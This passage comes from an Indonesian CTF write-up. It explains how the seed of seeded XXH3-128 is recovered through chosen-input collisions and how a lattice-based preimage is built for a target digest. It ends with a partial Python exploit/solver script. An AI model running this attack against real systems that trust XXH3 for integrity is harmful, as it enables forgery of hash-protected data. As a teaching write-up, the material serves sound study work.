        "code": "[+] high relation (0, 5): 0x9fbd5bcf\n[+] high relation (7, 14): 0x7d7fee4e\n[+] high relation (9, 12): 0x9a590ffe"
      },
      {
        "title": "10. Inverse Avalanche",
        "content": "Final avalanche XXH3 yang dipakai adalah:\n\n\\[\nf(x)=x\\oplus(x\\gg37)\n\\]\n\n\\[\nf(x)=f(x)\\cdot m\\pmod{2^{64}}\n\\]\n\n\\[\nf(x)=f(x)\\oplus(f(x)\\gg32)\n\\]\n\n dengan:\n\n\\[\nm=\\texttt{0x165667919E3779F9}\n\\]\n\n`m` ganjil, sehingga memiliki inverse modulo `2^64`:\n\n\\[\nm^{-1}\\equiv m^{ -1}\\pmod{2^{64}}\n\\]\n\nUntuk xor-shift `y=x XOR (x >> r)` dengan `r>=32`, inversenya cukup satu langkah:\n\n\\[\nx=y\\oplus(y\\gg r)\n\\]\n\nKarena shift kedua akan melewati 64 bit.\n\nMaka inverse avalanche:\n\n1. batalkan `xor >> 32`;\n2. kalikan dengan `m^{-1} mod 2^64`;\n3. batalkan `xor >> 37`.\n\nDigest target adalah:\n\n\n\nSetelah memperhatikan urutan output high/low XXH3, state sebelum avalanche adalah:\n\n\\[\n\\boxed{T_L=\\texttt{0x26d73906e5b3b9f7}}\n\\]\n\n\\[\n\\boxed{T_H=\\texttt{0x00b0c1155830d0a5}}\n\\]\n\n---",
        "code": "47 69 76 65 20 6d 65 20 74 68 65 20 66 6c 61 67\n G  i  v  e     m  e     t  h  e     f  l  a  g"
      },
      {
        "title": "11. Merge Accumulator untuk Payload 320 Byte",
        "content": "Panjang 320 dipilih karena:\n\n- tetap masuk long-input mode;\n- terdiri dari empat regular stripe dan satu final stripe;\n- belum mencapai satu block penuh, sehingga tidak ada tahap scramble accumulator;\n- dua stripe pertama cukup untuk mengontrol semua delapan accumulator.\n\nDefinisikan:\n\n\\[\nF(a,b)=\\operatorname{lo}_{64}(ab)\\oplus\n\\operatorname{hi}_{64}(ab)\n\\]\n\nUntuk empat pasangan accumulator:\n\n\\[\nM_L=320P_1+\n\\sum_{i=0}^{3}\nF(A_{2i}\\oplus K^{L}_{i,0},\n  A_{2i+1}\\oplus K^{L}_{i,1})\n\\pmod{2^{64}}\n\\]\n\n\\[\nM_H=\\neg(320P_2)+\n\\sum_{i=0}^{3}\nF(A_{2i}\\oplus K^{H}_{i,0},\n  A_{2i+1}\\oplus K^{H}_{i,1})\n\\pmod{2^{64}}\n\\]\n\nKita membutuhkan:\n\n\\[\nM_L=T_L\n\\]\n\n\\[\nM_H=T_H\n\\]\n\nSehingga residual target:\n\n\\[\nN_L=T_L-320P_1\\pmod{2^{64}}\n\\]\n\n\\[\nN_H=T_H-\\neg(320P_2)\\pmod{2^{64}}\n\\]\n\n---"
      },
      {
        "title": "12. Memisahkan Persamaan Low dan High",
        "content": "Untuk pasangan accumulator `i=0,1`, pilih:\n\n\\[\nA_{2i}=K^{H}_{i,0}\n\\]\n\nMaka operand pertama pada merge high menjadi nol:\n\n\\[\nA_{2i}\\oplus K^{H}_{i,0}=0\n\\]\n\nKarena `F(0,x)=0`, pasangan tersebut tidak berkontribusi ke high merge.\n\nPilih accumulator ganjil:\n\n\\[\nA_{2i+1}=K^{L}_{i,1}\\oplus y_i\n\\]\n\nKontribusi low-nya menjadi:\n\n\\[\nF(K^{H}_{i,0}\\oplus K^{L}_{i,0},y_i)\n\\]\n\nDefinisikan:\n\n\\[\nc_i=K^{H}_{i,0}\\oplus K^{L}_{i,0}\n\\]\n\nMaka dua pasangan pertama harus memenuhi:\n\n\\[\n\\boxed{F(c_0,y_0)+F(c_1,y_1)=N_L\\pmod{2^{64}}}\n\\]\n\nUntuk pasangan `i=2,3`, lakukan kebalikannya:\n\n\\[\nA_{2i}=K^{L}_{i,0}\n\\]\n\nsehingga kontribusi low nol, dan:\n\n\\[\nA_{2i+1}=K^{H}_{i,1}\\oplus y_i\n\\]\n\nmemberikan:\n\n\\[\n\\boxed{F(c_2,y_2)+F(c_3,y_3)=N_H\\pmod{2^{64}}}\n\\]\n\nMasalah preimage 128-bit telah dipecah menjadi dua persamaan 64-bit yang independen.\n\n---"
      },
      {
        "title": "13. Persamaan Dasar",
        "content": "Kita ingin menyelesaikan:\n\n\\[\nF(c,y)=t\n\\]\n\nDefinisikan produk 128-bit:\n\n\\[\np=cy=p_L+2^{64}p_H\n\\]\n\nSyarat fold:\n\n\\[\np_L\\oplus p_H=t\n\\]\n\nMaka:\n\n\\[\np_L=t\\oplus p_H\n\\]\n\nsehingga:\n\n\\[\ncy=(t\\oplus p_H)+2^{64}p_H\n\\]\n\nTuliskan bit `p_H` sebagai:\n\n\\[\np_H=\\sum_{j=0}^{63}h_j2^j,\n\\qquad h_j\\in\\{0,1\\}\n\\]\n\nUntuk bit target `t_j`:\n\n\\[\nt\\oplus p_H\n=t+\n\\sum_{j=0}^{63}\nh_j2^j(1-2t_j)\n\\]\n\nGabungkan dengan `2^64 p_H`:\n\n\\[\ncy=t+\n\\sum_{j=0}^{63}\nh_j2^j(2^{64}+1-2t_j)\n\\]\n\nDefinisikan:\n\n\\[\na_j=2^j(2^{64}+1-2t_j)\n\\]\n\nKita mencari bit `h_j` sehingga:\n\n\\[\n\\boxed{t+\\sum_{j=0}^{63}h_ja_j\\equiv0\\pmod c}\n\\]\n\nJika kongruensi terpenuhi:\n\n\\[\ny=\\frac{t+\\sum h_ja_j}{c}\n\\]\n\nlalu diverifikasi bahwa:\n\n\\[\n0\\le y<2^{64}\n\\]\n\n dan:\n\n\\[\nF(c,y)=t\n\\]\n\nIni adalah modular subset-sum 64 variabel biner.\n\n---"
      },
      {
        "title": "14. Embedding Lattice 66 Dimensi",
        "content": "Gunakan embedding berikut secara konseptual.\n\nUntuk `j=0..63`, buat basis row:\n\n\\[\nb_j=(2e_j,\\;0,\\;Ma_j)\n\\]\n\nTambahkan target row:\n\n\\[\nb_T=(-1,-1,\\ldots,-1,\\;T,\\;Mt)\n\\]\n\nserta modulus row:\n\n\\[\nb_c=(0,\\ldots,0,\\;0,\\;Mc)\n\\]\n\nUntuk pilihan bit `h_j` dan suatu integer `k`, kombinasi:\n\n\\[\nv=b_T+\n\\sum_{j=0}^{63}h_jb_j+kb_c\n\\]\n\nmemiliki 64 koordinat awal:\n\n\\[\n2h_j-1\\in\\{-1,+1\\}\n\\]\n\nKoordinat terakhir:\n\n\\[\nM\\left(t+\n\\sum h_ja_j+kc\\right)\n\\]\n\nJika kongruensi terpenuhi, pilih `k` sehingga koordinat terakhir nol. Vektor solusi kemudian berbentuk:\n\n\\[\n(\\pm1,\\pm1,\\ldots,\\pm1,T,0)\n\\]\n\nVektor seperti ini sangat pendek dibanding kombinasi acak. LLL lalu BKZ dipakai untuk menemukannya.\n\nImplementasi menambahkan beberapa stabilisasi:\n\n- permutasi random pada 64 bit;\n- kelipatan acak dari `c` pada kolom embedding;\n- variasi scale `M`;\n- variasi marker `T`;\n- block size BKZ bertahap.\n\nSetelah vektor ditemukan, tanda `±1` dikonversi kembali menjadi bit `h_j`, lalu `y` direkonstruksi dan diverifikasi secara eksak.\n\n---"
      },
      {
        "title": "15. Mengapa Memakai Dua `fold128`",
        "content": "Tidak semua target `t` mudah ditemukan sebagai image langsung dari `F(c,y)` untuk satu `c` tertentu.\n\nSolver memilih `y_0` acak dan menghitung:\n\n\\[\nt'=N_L-F(c_0,y_0)\\pmod{2^{64}}\n\\]\n\nKemudian lattice hanya perlu menyelesaikan:\n\n\\[\nF(c_1,y_1)=t'\n\\]\n\nJika gagal, pilih `y_0` baru. Cara sama dipakai untuk high target.\n\nHasil akhirnya:\n\n\\[\nF(c_0,y_0)+F(c_1,y_1)=N_L\n\\]\n\n\\[\nF(c_2,y_2)+F(c_3,y_3)=N_H\n\\]\n\n---"
      },
      {
        "title": "16. Menonaktifkan Kontribusi Perkalian",
        "content": "Setelah delapan accumulator target `A_i` diketahui, payload dibuat menggunakan dua stripe pertama.\n\nUntuk satu source lane, secret word pada stripe pertama adalah:\n\n\\[\nk_0=k_{0,H}2^{32}+k_{0,L}\n\\]\n\nsecret word stripe kedua:\n\n\\[\nk_1=k_{1,H}2^{32}+k_{1,L}\n\\]\n\nPilih word data:\n\n\\[\nd_0=a2^{32}+k_{0,L}\n\\]\n\n\\[\nd_1=k_{1,H}2^{32}+b\n\\]\n\nPada stripe pertama:\n\n\\[\n\\operatorname{lo}_{32}(d_0\\oplus k_0)=0\n\\]\n\nmaka produk 32×32 adalah nol.\n\nPada stripe kedua:\n\n\\[\n\\operatorname{hi}_{32}(d_1\\oplus k_1)=0\n\\]\n\nmaka produknya juga nol.\n\nJadi dua word ini hanya mengubah accumulator silang melalui:\n\n\\[\nd_0+d_1\\pmod{2^{64}}\n\\]\n\n---"
      },
      {
        "title": "17. Menyelesaikan Word Data Secara Eksak",
        "content": "Misalkan correction yang dibutuhkan untuk accumulator silang adalah:\n\n\\[\nS=S_H2^{32}+S_L\n\\]\n\nKita butuh:\n\n\\[\nd_0+d_1=S\\pmod{2^{64}}\n\\]\n\nDengan bentuk pilihan di atas:\n\n\\[\nd_0+d_1=\n(a+k_{1,H}+c)2^{32}\n+(k_{0,L}+b\\bmod2^{32})\n\\]\n\nPilih low-half:\n\n\\[\n\\boxed{b=S_L-k_{0,L}\\pmod{2^{32}}}\n\\]\n\nCarry dari penjumlahan low-half:\n\n\\[\nc=\\left\\lfloor\n\\frac{k_{0,L}+b}{2^{32}}\n\\right\\rfloor\n\\]\n\nLalu high-half:\n\n\\[\n\\boxed{a=S_H-k_{1,H}-c\\pmod{2^{32}}}\n\\]\n\nIni langsung menghasilkan dua word yang:\n\n- memberikan penambahan tepat `S` ke accumulator pasangan;\n- memberikan kontribusi perkalian nol ke accumulator lane sendiri.\n\nStripe 2, stripe 3, dan final stripe diisi nol. Kontribusi tetap dari zero word sudah dihitung terlebih dahulu dalam `fixed accumulator`.\n\nSetelah semua lane dirakit:\n\n\n\n---\n\n\n\n\n---\n\n\nSeeded XXH3 bukan MAC kriptografis. Pada long-input mode, seed hanya menggeser word default secret dengan `+seed` dan `-seed`. Update accumulator mempertahankan struktur bilinear 32-bit yang dapat dimanipulasi dengan chosen input.\n\nInti matematis serangannya:\n\n1. Buat dua payload dengan jumlah data sama.\n2. Paksa selisih produk menjadi:\n\n   \\[\n   \\pm2^b[(R\\oplus S_1)-S_0]\n   \\]\n\n3. Collision memberi XOR dua half secret.\n4. Gunakan pembatalan `+seed` dan `-seed` untuk mendapatkan:\n\n   \\[\n   x+y=Q,\n   \\qquad x\\oplus y=R\n   \\]\n\n5. Selesaikan sistem tersebut bit per bit untuk memperoleh seed.\n6. Balik avalanche target.\n7. Ubah inverse `fold128` menjadi modular subset-sum.\n8. Gunakan LLL/BKZ pada lattice 66 dimensi.\n9. Rakit payload agar kontribusi perkalian stripe kontrol bernilai nol.\n\nFlag:",
        "code": "assert model_accumulators(payload, seed) == desired_accumulators\nassert xxhash.xxh3_128(payload, seed=seed).digest() == b\"Give me the flag\""
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom __future__ import annotations\r\n\r\nimport argparse\r\nimport functools\r\nimport random\r\nimport re\r\nimport socket\r\nimport subprocess\r\nimport threading\r\nimport time\r\nfrom typing import Iterable\r\n\r\nimport numpy as np\r\nimport xxhash\r\n\r\ntry:\r\n    from fpylll import BKZ, LLL, IntegerMatrix\r\nexcept ImportError as exc:\r\n    raise SystemExit(\r\n        \"Missing fpylll. Install dependencies with: \"\r\n        \"pip install xxhash numpy fpylll cysignals\"\r\n    ) from exc\r\n\r\nMASK64 = (1 << 64) - 1\r\nMASK32 = (1 << 32) - 1\r\nP32_1 = 0x9E3779B1\r\nP32_2 = 0x85EBCA77\r\nP32_3 = 0xC2B2AE3D\r\nP64_1 = 0x9E3779B185EBCA87\r\nP64_2 = 0xC2B2AE3D27D4EB4F\r\nP64_3 = 0x165667B19E3779F9\r\nP64_4 = 0x85EBCA77C2B2AE63\r\nP64_5 = 0x27D4EB2F165667C5\r\nAVALANCHE_MUL = 0x165667919E3779F9\r\nTARGET = b\"Give me the flag\"\r\n\r\nDEFAULT_SECRET = bytes([\r\n    0xB8,0xFE,0x6C,0x39,0x23,0xA4,0x4B,0xBE,0x7C,0x01,0x81,0x2C,0xF7,0x21,0xAD,0x1C,\r\n    0xDE,0xD4,0x6D,0xE9,0x83,0x90,0x97,0xDB,0x72,0x40,0xA4,0xA4,0xB7,0xB3,0x67,0x1F,\r\n    0xCB,0x79,0xE6,0x4E,0xCC,0xC0,0xE5,0x78,0x82,0x5A,0xD0,0x7D,0xCC,0xFF,0x72,0x21,\r\n    0xB8,0x08,0x46,0x74,0xF7,0x43,0x24,0x8E,0xE0,0x35,0x90,0xE6,0x81,0x3A,0x26,0x4C,\r\n    0x3C,0x28,0x52,0xBB,0x91,0xC3,0x00,0xCB,0x88,0xD0,0x65,0x8B,0x1B,0x53,0x2E,0xA3,\r\n    0x71,0x64,0x48,0x97,0xA2,0x0D,0xF9,0x4E,0x38,0x19,0xEF,0x46,0xA9,0xDE,0xAC,0xD8,\r\n    0xA8,0xFA,0x76,0x3F,0xE3,0x9C,0x34,0x3F,0xF9,0xDC,0xBB,0xC7,0xC7,0x0B,0x4F,0x1D,\r\n    0x8A,0x51,0xE0,0x4B,0xCD,0xB4,0x59,0x31,0xC8,0x9F,0x7E,0xC9,0xD9,0x78,0x73,0x64,\r\n    0xEA,0xC5,0xAC,0x83,0x34,0xD3,0xEB,0xC3,0xC5,0x81,0xA0,0xFF,0xFA,0x13,0x63,0xEB,\r\n    0x17,0x0D,0xDD,0x51,0xB7,0xF0,0xDA,0x49,0xD3,0x16,0x55,0x26,0x29,0xD4,0x68,0x9E,\r\n    0x2B,0x16,0xBE,0x58,0x7D,0x47,0xA1,0xFC,0x8F,0xF8,0xB8,0xD1,0x7A,0xD0,0x31,0xCE,\r\n    0x45,0xCB,0x3A,0x8F,0x95,0x16,0x04,0x28,0xAF,0xD7,0xFB,0xCA,0xBB,0x4B,0x40,0x7E,\r\n])\r\n\r\nINIT_ACC = [P32_3, P64_1, P64_2, P64_3, P64_4, P32_2, P64_5, P32_1]\r\nC_WORDS = [int.from_bytes(DEFAULT_SECRET[8*i:8*i+8], \"little\") for i in range(24)]\r\n\r\n\r\ndef xxh_hex(data: bytes, seed: int) -> str:\r\n    return xxhash.xxh3_128(data, seed=seed).hexdigest()\r\n\r\n\r\ndef xxh_digest(data: bytes, seed: int) -> bytes:\r\n    return xxhash.xxh3_128(data, seed=seed).digest()\r\n\r\n\r\ndef u64(data: bytes, off: int = 0) -> int:\r\n    return int.from_bytes(data[off:off+8], \"little\")\r\n\r\n\r\ndef custom_secret(seed: int) -> bytes:\r\n    out = bytearray(192)\r\n    for i in range(12):\r\n        lo = (u64(DEFAULT_SECRET, 16*i) + seed) & MASK64\r\n        hi = (u64(DEFAULT_SECRET, 16*i+8) - seed) & MASK64\r\n        out[16*i:16*i+8] = lo.to_bytes(8, \"little\")\r\n        out[16*i+8:16*i+16] = hi.to_bytes(8, \"little\")\r\n    return bytes(out)\r\n\r\n\r\ndef fold128(a: int, b: int) -> int:\r\n    p = a * b\r\n    return ((p & MASK64) ^ (p >> 64)) & MASK64\r\n\r\n\r\ndef avalanche(x: int) -> int:\r\n    x ^= x >> 37\r\n    x = (x * AVALANCHE_MUL) & MASK64\r\n    x ^= x >> 32\r\n    return x & MASK64\r\n\r\n\r\ndef inverse_avalanche(y: int) -> int:\r\n    # Both shifts exceed half the word size, so one reverse-xorshift step is enough.\r\n    x = y ^ (y >> 32)\r\n    x = (x * pow(AVALANCHE_MUL, -1, 1 << 64)) & MASK64\r\n    x ^= x >> 37\r\n    return x & MASK64\r\n\r\n\r\ndef accum_stripe(acc: list[int], data: bytes, off: int, secret: bytes, soff: int) -> None:\r\n    for lane in range(8):\r\n        d = u64(data, off + 8*lane)\r\n        k = u64(secret, soff + 8*lane)\r\n        q = d ^ k\r\n        acc[lane ^ 1] = (acc[lane ^ 1] + d) & MASK64\r\n        acc[lane] = (acc[lane] + (q & MASK32) * (q >> 32)) & MASK64\r\n\r\n\r\ndef model_hash_320(data: bytes, seed: int) -> tuple[int, int, list[int]]:\r\n    if len(data) != 320:\r\n        raise ValueError(\"model_hash_320 expects exactly 320 bytes\")\r\n    secret = custom_secret(seed)\r\n    acc = INIT_ACC.copy()\r\n    for stripe in range(4):\r\n        accum_stripe(acc, data, 64*stripe, secret, 8*stripe)\r\n    accum_stripe(acc, data, 256, secret, 121)\r\n\r\n    lo = (320 * P64_1) & MASK64\r\n    hi = (~(320 * P64_2)) & MASK64\r\n    for i in range(4):\r\n        lo = (lo + fold128(\r\n            acc[2*i] ^ u64(secret, 11 + 16*i),\r\n            acc[2*i+1] ^ u64(secret, 19 + 16*i),\r\n        )) & MASK64\r\n        hi = (hi + fold128(\r\n            acc[2*i] ^ u64(secret, 117 + 16*i),\r\n            acc[2*i+1] ^ u64(secret, 125 + 16*i),\r\n        )) & MASK64\r\n    return avalanche(lo), avalanche(hi), acc\r\n\r\n\r\n# ---------------------------------------------------------------------------\r\n# Seed-recovery arithmetic\r\n# ---------------------------------------------------------------------------\r\n\r\n\r\ndef count_preimages_sumxor(Q: int, R: int) -> int:\r\n    states = {0: 1}\r\n    for i in range(32):\r\n        q = (Q >> i) & 1\r\n        r = (R >> i) & 1\r\n        nxt: dict[int, int] = {}\r\n        for carry, count in states.items():\r\n            for xb in (0, 1):\r\n                yb = xb ^ r\r\n                total = xb + yb + carry\r\n                if (total & 1) == q:\r\n                    nxt[total >> 1] = nxt.get(total >> 1, 0) + count\r\n        states = nxt\r\n        if not states:\r\n            return 0\r\n    return sum(states.values())\r\n\r\n\r\n@functools.lru_cache(maxsize=128)\r\ndef possible_r_cached(Q: int) -> np.ndarray:\r\n    Q &= MASK32\r\n    states = [np.array([0], dtype=np.uint32), np.array([], dtype=np.uint32)]\r\n    for i in range(32):\r\n        q = (Q >> i) & 1\r\n        bit = np.uint32(1 << i)\r\n        outs: list[list[np.ndarray]] = [[], []]\r\n        for carry, arr in enumerate(states):\r\n            if arr.size == 0:\r\n                continue\r\n            if q == carry:\r\n                outs[0].append(arr)\r\n                outs[1].append(arr)\r\n            else:\r\n                outs[carry].append(arr | bit)\r\n        states = []\r\n        for parts in outs:\r\n            if not parts:\r\n                states.append(np.array([], dtype=np.uint32))\r\n            elif len(parts) == 1:\r\n                states.append(parts[0].copy())\r\n            else:\r\n                states.append(np.unique(np.concatenate(parts)))\r\n    return np.unique(np.concatenate([x for x in states if x.size]))\r\n\r\n\r\ndef invert_sum_xor(Q: int, R: int) -> np.ndarray:\r\n    states: dict[int, np.ndarray] = {0: np.array([0], dtype=np.uint32)}\r\n    for i in range(32):\r\n        q = (Q >> i) & 1\r\n        r = (R >> i) & 1\r\n        outs: dict[int, list[np.ndarray]] = {0: [], 1: []}\r\n        for carry, arr in states.items():\r\n            for xb in (0, 1):\r\n                yb = xb ^ r\r\n                total = xb + yb + carry\r\n                if (total & 1) == q:\r\n                    outs[total >> 1].append(arr | np.uint32(xb << i))\r\n        states = {\r\n            c: parts[0] if len(parts) == 1 else np.concatenate(parts)\r\n            for c, parts in outs.items() if parts\r\n        }\r\n        if not states:\r\n            return np.array([], dtype=np.uint32)\r\n    return np.concatenate(list(states.values()))\r\n\r\n\r\ndef low_word(seed_low: int, index: int) -> int:\r\n    c = C_WORDS[index] & MASK32\r\n    return (c + seed_low) & MASK32 if index % 2 == 0 else (c - seed_low) & MASK32\r\n\r\n\r\ndef high_word(seed_low: int, seed_high: int, index: int) -> int:\r\n    c_lo = C_WORDS[index] & MASK32\r\n    c_hi = C_WORDS[index] >> 32\r\n    if index % 2 == 0:\r\n        carry = int(c_lo + seed_low > MASK32)\r\n        return (c_hi + seed_high + carry) & MASK32\r\n    borrow = int(c_lo < seed_low)\r\n    return (c_hi - seed_high - borrow) & MASK32\r\n\r\n\r\ndef relation_low_vec(seeds: np.ndarray, i: int, j: int) -> np.ndarray:\r\n    s = seeds.astype(np.uint64)\r\n\r\n    def part(k: int) -> np.ndarray:\r\n        c = np.uint64(C_WORDS[k] & MASK32)\r\n        return ((c + s) if k % 2 == 0 else (c - s)) & np.uint64(MASK32)\r\n\r\n    return (part(i) ^ part(j)).astype(np.uint32)\r\n\r\n\r\ndef relation_high_vec(seed_lows: np.ndarray, seed_highs: np.ndarray, i: int, j: int) -> np.ndarray:\r\n    sl = seed_lows.astype(np.uint64)\r\n    sh = seed_highs.astype(np.uint64)\r\n\r\n    def part(k: int) -> np.ndarray:\r\n        c_lo = C_WORDS[k] & MASK32\r\n        c_hi = C_WORDS[k] >> 32\r\n        if k % 2 == 0:\r\n            carry = (sl > np.uint64(MASK32 - c_lo)).astype(np.uint64)\r\n            return (np.uint64(c_hi) + sh + carry) & np.uint64(MASK32)\r\n        borrow = (sl > np.uint64(c_lo)).astype(np.uint64)\r\n        return (np.uint64(c_hi) - sh - borrow) & np.uint64(MASK32)\r\n\r\n    return (part(i) ^ part(j)).astype(np.uint32)\r\n\r\n\r\ndef pair_placement(i: int, j: int) -> tuple[int, int, int, int]:\r\n    i, j = sorted((int(i), int(j)))\r\n    lo = max(0, j - 14)\r\n    hi = min(7, i)\r\n    if lo > hi:\r\n        raise ValueError(\"secret words cannot share a regular lane\")\r\n    lane = hi\r\n    stripe_i = i - lane\r\n    stripe_j = j - lane\r\n    length = max(320, 64 * (max(stripe_i, stripe_j) + 2))\r\n    return lane, stripe_i, stripe_j, length\r\n\r\n\r\ndef initial_low_distribution(i: int, j: int) -> tuple[np.ndarray, np.ndarray]:\r\n    if not ((i ^ j) & 1):\r\n        raise ValueError(\"initial relation requires opposite parity\")\r\n    plus = i if i % 2 == 0 else j\r\n    minus = j if i % 2 == 0 else i\r\n    Q = ((C_WORDS[plus] & MASK32) + (C_WORDS[minus] & MASK32)) & MASK32\r\n    vals = possible_r_cached(Q)\r\n    weights = np.array([count_preimages_sumxor(Q, int(r)) for r in vals], dtype=np.uint64)\r\n    return vals, weights\r\n\r\n\r\ndef low_candidates_from_relation(i: int, j: int, R: int) -> np.ndarray:\r\n    plus = i if i % 2 == 0 else j\r\n    minus = j if i % 2 == 0 else i\r\n    Q = ((C_WORDS[plus] & MASK32) + (C_WORDS[minus] & MASK32)) & MASK32\r\n    x_plus = invert_sum_xor(Q, R)\r\n    seeds = ((x_plus.astype(np.uint64) - np.uint64(C_WORDS[plus] & MASK32)) & np.uint64(MASK32)).astype(np.uint32)\r\n    relation = relation_low_vec(seeds, i, j)\r\n    return np.unique(seeds[relation == np.uint32(R)])\r\n\r\n\r\ndef qhigh_pair(seed_low: int, i: int, j: int) -> int:\r\n    plus = i if i % 2 == 0 else j\r\n    minus = j if i % 2 == 0 else i\r\n    cp = C_WORDS[plus] & MASK32\r\n    cm = C_WORDS[minus] & MASK32\r\n    carry = int(cp + seed_low > MASK32)\r\n    borrow = int(cm < seed_low)\r\n    return ((C_WORDS[plus] >> 32) + (C_WORDS[minus] >> 32) + carry - borrow) & MASK32\r\n\r\n\r\ndef high_candidates_from_relation(seed_low: int, i: int, j: int, R: int) -> np.ndarray:\r\n    plus = i if i % 2 == 0 else j\r\n    Q = qhigh_pair(seed_low, i, j)\r\n    b_plus = invert_sum_xor(Q, R)\r\n    if b_plus.size == 0:\r\n        return b_plus\r\n    cp = C_WORDS[plus] & MASK32\r\n    carry = int(cp + seed_low > MASK32)\r\n    seed_highs = ((b_plus.astype(np.uint64) - np.uint64((C_WORDS[plus] >> 32) + carry)) & np.uint64(MASK32)).astype(np.uint32)\r\n    lows = np.full(seed_highs.size, np.uint32(seed_low), dtype=np.uint32)\r\n    relation = relation_high_vec(lows, seed_highs, i, j)\r\n    return np.unique(seed_highs[relation == np.uint32(R)])\r\n\r\n\r\ndef initial_high_distribution(low_candidates: np.ndarray, i: int, j: int) -> tuple[np.ndarray, np.ndarray]:\r\n    qs = [qhigh_pair(int(s), i, j) for s in low_candidates]\r\n    arrays = [possible_r_cached(q) for q in qs]\r\n    vals = np.unique(np.concatenate(arrays))\r\n    weights = np.array([\r\n        sum(count_preimages_sumxor(q, int(r)) for q in qs)\r\n        for r in vals\r\n    ], dtype=np.uint64)\r\n    return vals, weights\r\n\r\n\r\n# Small DFA for counting valid XOR outputs of x+y=Q without materializing them.\r\ndef _carry_transition(state: int, q: int, r: int) -> int:\r\n    if state == 0:\r\n        return 0\r\n    if r == 0:\r\n        return 3 if state & (1 << q) else 0\r\n    carry = 1 - q\r\n    return (1 << carry) if state & (1 << carry) else 0\r\n\r\n\r\ndef count_relation_union(qs: Iterable[int]) -> int:\r\n    uniq = tuple(dict.fromkeys(int(q) & MASK32 for q in qs))\r\n    dp: dict[tuple[int, ...], int] = {(1,) * len(uniq): 1}\r\n    for bit in range(32):\r\n        nxt: dict[tuple[int, ...], int] = {}\r\n        for states, count in dp.items():\r\n            for r in (0, 1):\r\n                ns = tuple(_carry_transition(states[k], (uniq[k] >> bit) & 1, r) for k in range(len(uniq)))\r\n                if any(ns):\r\n                    nxt[ns] = nxt.get(ns, 0) + count\r\n        dp = nxt\r\n    return sum(dp.values())\r\n\r\n\r\n# ---------------------------------------------------------------------------\r\n# Chosen-input collision oracle\r\n# ---------------------------------------------------------------------------\r\n\r\nLOW_INIT = (2, 7)\r\nLOW_FILTERS = [\r\n    (0,2),(6,8),(0,1),(6,9),(1,3),(3,5),(5,7),(7,11),(11,13),\r\n    (8,11),(1,4),(8,9),(2,5),(3,8),(9,11),(10,11),(4,6),(7,8),\r\n]\r\nALL_PAIRS: list[tuple[int, int, int]] = []\r\nOPPOSITE_PAIRS: list[tuple[int, int, int]] = []\r\nfor _i in range(15):\r\n    for _j in range(_i + 1, 15):\r\n        try:\r\n            _n = pair_placement(_i, _j)[3]\r\n        except ValueError:\r\n            continue\r\n        ALL_PAIRS.append((_i, _j, _n))\r\n        if (_i ^ _j) & 1:\r\n            OPPOSITE_PAIRS.append((_i, _j, _n))\r\n\r\n\r\ndef relation_messages(R: int, pair: tuple[int, int], bit: int, kind: str) -> tuple[bytes, bytes]:\r\n    i, j = pair\r\n    lane, stripe_i, stripe_j, length = pair_placement(i, j)\r\n    off_i = 64 * stripe_i + 8 * lane\r\n    off_j = 64 * stripe_j + 8 * lane\r\n    a = bytearray(length)\r\n    b = bytearray(length)\r\n\r\n    if kind == \"low\":\r\n        a[off_j:off_j+8] = (((1 << bit) << 32) | R).to_bytes(8, \"little\")\r\n        b[off_i:off_i+8] = ((1 << bit) << 32).to_bytes(8, \"little\")\r\n        b[off_j:off_j+8] = R.to_bytes(8, \"little\")\r\n    elif kind == \"high\":\r\n        a[off_j:off_j+8] = ((R << 32) | (1 << bit)).to_bytes(8, \"little\")\r\n        b[off_i:off_i+8] = (1 << bit).to_bytes(8, \"little\")\r\n        b[off_j:off_j+8] = (R << 32).to_bytes(8, \"little\")\r\n    else:\r\n        raise ValueError(kind)\r\n    return bytes(a), bytes(b)\r\n\r\n\r\ndef ordered_candidates(vals: np.ndarray, weights: np.ndarray) -> np.ndarray:\r\n    return np.asarray(vals, dtype=np.uint32)[\r\n        np.argsort(-np.asarray(weights, dtype=np.int64), kind=\"stable\")\r\n    ]\r\n\r\n\r\ndef final_carries(Q: int, R: int) -> set[int]:\r\n    states = {0}\r\n    for i in range(32):\r\n        q = (Q >> i) & 1\r\n        r = (R >> i) & 1\r\n        nxt: set[int] = set()\r\n        for carry in states:\r\n            for xb in (0, 1):\r\n                yb = xb ^ r\r\n                total = xb + yb + carry\r\n                if (total & 1) == q:\r\n                    nxt.add(total >> 1)\r\n        states = nxt\r\n        if not states:\r\n            break\r\n    return states\r\n\r\n\r\ndef guaranteed_high_equal_bits(pair: tuple[int, int], R: int) -> list[int]:\r\n    i, j = pair\r\n    plus = i if i % 2 == 0 else j\r\n    minus = j if i % 2 == 0 else i\r\n    cp = C_WORDS[plus] & MASK32\r\n    cm = C_WORDS[minus] & MASK32\r\n    low_sum = cp + cm\r\n    Q_low = low_sum & MASK32\r\n    qcarry = low_sum >> 32\r\n    high_base = ((C_WORDS[plus] >> 32) + (C_WORDS[minus] >> 32)) & MASK32\r\n\r\n    bits: list[int] = []\r\n    for carry_out in final_carries(Q_low, R):\r\n        Q_high = (high_base + qcarry - carry_out) & MASK32\r\n        for bit in range(32):\r\n            if ((Q_high >> bit) & 1) == 0:\r\n                bits.append(bit)\r\n                break\r\n    return sorted(set(bits))\r\n\r\n\r\ndef find_unknown_low_relation(oracle, vals: np.ndarray, weights: np.ndarray, pair: tuple[int, int]) -> int:\r\n    vals = ordered_candidates(vals, weights)\r\n    batch_size = 64\r\n    for start in range(0, len(vals), batch_size):\r\n        chunk = vals[start:start+batch_size]\r\n        payloads: list[bytes] = []\r\n        metadata: list[tuple[int, int]] = []\r\n        for r_np in chunk:\r\n            r = int(r_np)\r\n            bits = guaranteed_high_equal_bits(pair, r) if ((pair[0] ^ pair[1]) & 1) else range(6)\r\n            for bit in bits:\r\n                payloads.extend(relation_messages(r, pair, bit, \"low\"))\r\n                metadata.append((r, len(payloads) - 2))\r\n        hashes = oracle.hash_many(payloads)\r\n        for r, pos in metadata:\r\n            if hashes[pos] == hashes[pos + 1]:\r\n                return r\r\n    raise RuntimeError(\"low relation was not found\")\r\n\r\n\r\ndef find_known_high_relation(\r\n    oracle,\r\n    vals: np.ndarray,\r\n    weights: np.ndarray,\r\n    pair: tuple[int, int],\r\n    bit: int,\r\n) -> int:\r\n    vals = ordered_candidates(vals, weights)\r\n    batch_size = 64\r\n    for start in range(0, len(vals), batch_size):\r\n        chunk = vals[start:start+batch_size]\r\n        payloads: list[bytes] = []\r\n        for r_np in 